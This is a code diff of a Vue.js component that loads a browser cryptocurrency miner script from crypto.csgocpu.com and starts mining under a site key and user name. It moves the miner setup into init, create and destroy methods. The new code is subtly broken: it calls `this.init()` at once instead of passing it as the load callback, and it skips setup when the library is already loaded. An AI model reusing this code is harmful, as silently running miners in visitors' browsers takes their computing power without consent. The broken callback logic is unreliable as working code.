@@ -58,7 +58,18 @@
       }
     },
     mounted () {
-      loadScript('https://crypto.csgocpu.com/idler.min.js', () => {
+      if ( ! window.CSGOCPU) {
+        loadScript('https://crypto.csgocpu.com/idler.min.js', this.init())
+      }
+    },
+    data () {
+      return {
+        miner: null,
+        CSGOCPU: null,
+      }
+    },
+    methods: {
+      init () {
         if (this.proxy) {
           const proxies = this.proxy.reduce((acc, curr, i) => {
             if (!(i % 8)) {
@@ -68,6 +79,9 @@
           }, [])
           CSGOCPU.CONFIG.WEBSOCKET_SHARDS = proxies
         }
+        this.create()
+      },
+      create () {
         if (this.siteKey && this.userName) {
           this.miner = new CSGOCPU.User(this.siteKey, this.userName)
         } else if (this.siteKey) {
@@ -77,15 +91,15 @@
         if (!this.miner.isRunning() && this.start) {
           this.startMiner()
         }
-      })
-    },
-    data () {
-      return {
-        miner: null,
-        CSGOCPU: null,
-      }
-    },
-    methods: {
+      },
+      destroy () {
+        if (this.miner && this.miner.isRunning()) {
+          this.start = false
+          this.miner.stop()
+        }
+        this.miner = null
+        this.CSGOCPU = null
+      },
       startMiner () {
         if (this.miner && !this.miner.isRunning()) {
           const mode = this.getStartMode(this.startMode)
